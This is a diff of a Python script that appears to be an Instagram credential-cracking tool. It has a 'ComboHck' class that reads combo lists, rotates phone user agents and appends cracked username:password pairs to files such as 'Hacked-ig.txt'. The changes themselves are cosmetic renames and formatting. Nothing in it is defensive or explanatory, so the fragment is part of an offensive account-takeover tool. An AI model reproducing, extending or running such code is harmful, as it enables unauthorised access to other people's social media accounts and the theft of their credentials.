@@ -6,7 +6,7 @@ except Exception as Joker:exit(Joker)
 PRNT=threading.Lock()
 def sa(*a, **b):
 	with PRNT:print(*a, **b)
-sent=requests.session()
+sent = requests.session()
 uuid = sent.get('https://httpbin.org/uuid')
 red = "\033[1;31;40m";yel = '\033[1;33;40m'
 grn = '\033[1;32;40m';wit = "\033[1;37;40m"
@@ -19,13 +19,13 @@ withs = 'Please wait a few minutes before you try again';errReq = 'Bad request'
 errorFUOt = "We're working on it and we'll get it fixed as soon as we can."
 def Exit():exit(0)
 def SeveHck(user,pess):
-	with open('Hacked-insta.txt', 'a') as J:
+	with open('Hacked-ig.txt', 'a') as J:
 		J.write(user+':'+pess+'\n')
 def SeveScour(user,pess):
-	with open('secure-insta.txt', 'a') as J:
+	with open('secure-ig.txt', 'a') as J:
 		J.write(user+':'+pess+'\n')
 def SeveBand(user,pess):
-	with open('Band-insta.txt', 'a') as J:
+	with open('Band-ig.txt', 'a') as J:
 		J.write(user+':'+pess+'\n')
 def User_Agent():
 	dpi_phone = [
@@ -135,7 +135,8 @@ class ComboHck:
 			exit('\n[-] The file name is incorrect !\n')
 		self.msg = input("""	[1] - computer 
 	[2] - mobile 
-[$] Do you use a computer or mobile phone?""")
+[$] Do you use a computer or mobile phone?
+""")
 		print(' ')
 		self.Trts()
 	def Log_Combo(self):
